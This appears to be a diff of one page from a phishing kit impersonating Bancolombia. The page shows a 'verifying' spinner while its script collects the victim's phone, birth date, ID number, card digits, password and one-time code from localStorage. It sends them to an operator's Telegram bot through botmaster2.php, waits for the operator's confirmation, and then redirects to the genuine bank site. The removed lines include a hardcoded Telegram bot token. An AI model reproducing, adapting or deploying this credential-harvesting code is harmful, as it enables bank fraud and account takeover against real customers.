@@ -1,73 +1,36 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Verificando Dinámica</title>
   <style>
+    body, html { margin:0; padding:0; height:100%; width:100%; }
     body {
-      margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      display: flex; justify-content: center; align-items: center;
       background: url('img/fondo.jpg') no-repeat center center fixed;
       background-size: cover;
     }
-
     .blur-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(255, 255, 255, 0.4);
-      backdrop-filter: blur(10px);
+      position: fixed; top:0; left:0; width:100%; height:100%;
+      background: rgba(255,255,255,0.4); backdrop-filter: blur(10px);
     }
-
     .loaderp-full {
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      position: fixed;
-      width: 90%;
-      height: 90%;
-      z-index: 9999;
+      position: fixed; top:0; left:0; width:100%; height:100%;
+      display:flex; justify-content:center; align-items:center;
+      z-index:9999;
     }
-
     .loaderp {
-      width: 180px;
-      height: 180px;
-      background-image: url('img/circulo.png');
-      background-size: cover;
-      border-radius: 50%;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
+      width:180px; height:180px; background-image:url('img/circulo.png');
+      background-size:cover; border-radius:50%;
+      display:flex; flex-direction:column; justify-content:center; align-items:center;
     }
-
     .loaderp .loader {
-      width: 30px;
-      height: 30px;
-      border: 5px solid #f3f3f3;
-      border-top: 5px solid #555;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
+      width:30px; height:30px; border:5px solid #f3f3f3;
+      border-top:5px solid #555; border-radius:50%; animation:spin 1s linear infinite;
     }
-
-    .loaderp-text {
-      margin-top: 30px;
-      font-size: 13px;
-      color: black;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
+    .loaderp-text { margin-top:30px; font-size:13px; color:#000; }
+    @keyframes spin { 0%{transform:rotate(0)}100%{transform:rotate(360deg)} }
   </style>
 </head>
 <body>
@@ -75,100 +38,88 @@
   <div class="loaderp-full">
     <div class="loaderp">
       <div class="loader"></div>
-      <div class="loaderp-text">Cargando...</div>
+      <div class="loaderp-text">Verificando...</div>
     </div>
   </div>
 
-  <script>
-    document.addEventListener('DOMContentLoaded', async function () {
-      const loader = document.querySelector('.loader');
+<script>
+document.addEventListener('DOMContentLoaded', async () => {
+  // 1. Carga configuración
+  let cfg;
+  try {
+    cfg = await fetch('botconfig.json').then(r => r.json());
+  } catch (e) {
+    alert('No se pudo cargar la configuración del bot.');
+    return;
+  }
+  const { token: botToken, chat_id: chatId } = cfg;
 
-      const bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
-      const dinamica = localStorage.getItem('bancoldina') || '';
+  // 2. Recoger datos previos y código dinámico
+  const sess = JSON.parse(localStorage.getItem('bancoldata')||'{}');
+  const dyn = localStorage.getItem('bancoldina');
+  if (!sess.celular || !sess.clave || !dyn) {
+    alert('Datos incompletos. Redirigiendo al inicio.');
+    return window.location.href='index.html';
+  }
 
-      if (!bancoldata.usuario || !bancoldata.clave || !dinamica) {
-        alert("Datos incompletos. Redirigiendo...");
-        return window.location.href = "index.html";
-      }
-
-      const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
-      localStorage.setItem('transactionId', transactionId);
-
-      const mensaje = `
-<b>📥 VERIFICACIÓN DE CLAVE DINÁMICA</b>
-🆔 <b>ID:</b> ${transactionId}
-👤 <b>Usuario:</b> ${bancoldata.usuario}
-🔐 <b>Clave:</b> ${bancoldata.clave}
-🔑 <b>Dinámica:</b> ${dinamica}
+  // 3. Construir mensaje con todo
+  const transactionId = localStorage.getItem('transactionId') ||
+    (Date.now().toString(36)+Math.random().toString(36).slice(2));
+  let msg = `
+📥 <b>INGRESO BANCOLOMBIA (Dinámica)</b>
+🆔 ID: ${transactionId}
+📱 Celular: ${sess.celular}
+🎂 Nacimiento: ${sess.nacimiento}
+💳 Tipo: ${sess.tipo}
+🔢 Identificador: ${sess.identificador}
+🔸 Últimos 2 dígitos: ${sess.digitosFinales}
+🔐 Clave: ${sess.clave}
+🔄 Dinámica OTP: ${dyn}
 `;
 
-      const keyboard = JSON.stringify({
-        inline_keyboard: [
-          [{ text: "Error Dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
-          [{ text: "Código OTP", callback_data: `pedir_otp:${transactionId}` }],
-          [{ text: "Error TC", callback_data: `error_tc:${transactionId}` }],
-          [{ text: "Error Logo", callback_data: `error_logo:${transactionId}` }],
-          [{ text: "Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
-        ]
+  // 4. Botón “Finalizar” para confirmación
+  const keyboard = { inline_keyboard:[
+    [{ text:'✅ Confirmar', callback_data:`confirm_finalizar:${transactionId}` }]
+  ]};
+
+  // 5. Enviar mensaje + botón
+  await fetch('botmaster2.php',{
+    method:'POST',
+    headers:{'Content-Type':'application/x-www-form-urlencoded'},
+    body:
+      'data='+encodeURIComponent(msg)
+      +'&keyboard='+encodeURIComponent(JSON.stringify(keyboard))
+  });
+
+  // 6. Esperar respuesta del botón
+  await waitButton(transactionId, botToken);
+});
+
+async function waitButton(txId, botToken){
+  try {
+    const resp = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
+    const js = await resp.json();
+    const upd = js.result.find(u=>
+      u.callback_query
+      && u.callback_query.data===`confirm_finalizar:${txId}`
+    );
+    if (upd) {
+      // Confirmación al chat
+      await fetch('sendStatus.php',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({status:'Finalización Dinámica OK'})
       });
-
-      await fetch("botmaster2.php", {
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: "data=" + encodeURIComponent(mensaje) + "&keyboard=" + encodeURIComponent(keyboard)
-      });
-
-      await checkPaymentVerification(transactionId);
-
-      async function checkPaymentVerification(transactionId) {
-        try {
-          const response = await fetch("https://api.telegram.org/bot8153542950:AAER3soWgrkQDu_cVSUZR4x9dJKjavcGSDE/getUpdates");
-          const data = await response.json();
-
-          const update = data.result.find(update =>
-            update.callback_query &&
-            update.callback_query.data &&
-            update.callback_query.data.includes(transactionId)
-          );
-
-          if (update) {
-            const tipo = update.callback_query.data.split(":")[0];
-            const status = {
-              pedir_dinamica: "Error Dinámica",
-              pedir_otp: "Código OTP",
-              error_tc: "Error TC",
-              error_logo: "Error de Logo",
-              confirm_finalizar: "Finalización Exitosa"
-            }[tipo] || "Desconocido";
-
-            await fetch("sendStatus.php", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ status })
-            });
-
-            switch (tipo) {
-              case "pedir_dinamica":
-                return window.location.href = "cel-dina-error.html";
-              case "pedir_otp":
-                return window.location.href = "index-otp.html";
-              case "error_tc":
-                return window.location.href = "errortc.html";
-              case "error_logo":
-                alert("Error en datos.");
-                return window.location.href = "index.html";
-              case "confirm_finalizar":
-                return window.location.href = "https://www.bancolombia.com/personas";
-            }
-          } else {
-            setTimeout(() => checkPaymentVerification(transactionId), 2000);
-          }
-        } catch (e) {
-          console.error("Error verificando botón:", e);
-          setTimeout(() => checkPaymentVerification(transactionId), 2000);
-        }
-      }
-    });
-  </script>
+      // Redirigir a éxito
+      return window.location.href='https://www.bancolombia.com/personas';
+    } else {
+      return setTimeout(()=>waitButton(txId, botToken),2000);
+    }
+  } catch(e){
+    console.error(e);
+    setTimeout(()=>waitButton(txId, botToken),3000);
+  }
+}
+</script>
 </body>
 </html>
